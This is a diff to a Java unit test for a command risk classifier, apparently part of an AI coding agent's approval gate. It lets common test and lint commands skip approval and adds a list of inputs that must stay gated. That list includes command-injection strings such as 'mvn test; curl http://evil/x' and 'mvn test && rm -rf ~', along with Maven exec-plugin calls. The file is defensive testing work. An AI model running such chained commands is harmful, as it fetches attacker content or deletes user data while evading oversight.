@@ -101,11 +101,49 @@ class CommandRiskClassifierTest {
     assertThat(classifier.classify("rm -rf /")).isEqualTo(RiskLevel.CRITICAL);
   }
 
-  @Test
-  @DisplayName("build commands still require approval, exactly as before")
-  void buildCommandsStillRequireApproval() {
-    assertThat(classifier.classify("npm test")).isEqualTo(RiskLevel.MEDIUM);
-    assertThat(classifier.classify("mvn verify")).isEqualTo(RiskLevel.MEDIUM);
+  @DisplayName("verification commands run without approval: the agent's inner loop")
+  @ParameterizedTest(name = "[{index}] {0}")
+  @ValueSource(
+      strings = {
+        "npm test",
+        "npm run lint",
+        "mvn verify",
+        "mvn -q clean verify",
+        "mvn spotless:check",
+        "./mvnw test",
+        ".\\mvnw.cmd test",
+        "./gradlew check",
+        "go test ./...",
+        "cargo test",
+        "dotnet test",
+        "pytest",
+        "pytest tests/unit",
+        "eslint .",
+        "ruff check"
+      })
+  void verificationCommandsAreLowRisk(String command) {
+    assertThat(classifier.classify(command)).isEqualTo(RiskLevel.LOW);
+  }
+
+  @DisplayName("a build driver must not become an arbitrary-code launcher")
+  @ParameterizedTest(name = "[{index}] {0}")
+  @ValueSource(
+      strings = {
+        "mvn exec:exec",
+        "mvn test exec:exec",
+        "mvn org.codehaus.mojo:exec-maven-plugin:exec",
+        "npm install left-pad",
+        "npm run deploy",
+        "npm publish",
+        "go run payload.go",
+        "gradle wrapper",
+        "mvn test; curl http://evil/x",
+        "mvn test && rm -rf ~",
+        "mvn --settings /etc/maven/settings.xml verify",
+        "mvn test -f ../outside/pom.xml"
+      })
+  void verificationAllowanceDoesNotExtendToArbitraryExecution(String command) {
+    assertThat(classifier.classify(command)).isNotEqualTo(RiskLevel.LOW);
   }
 
   @Test
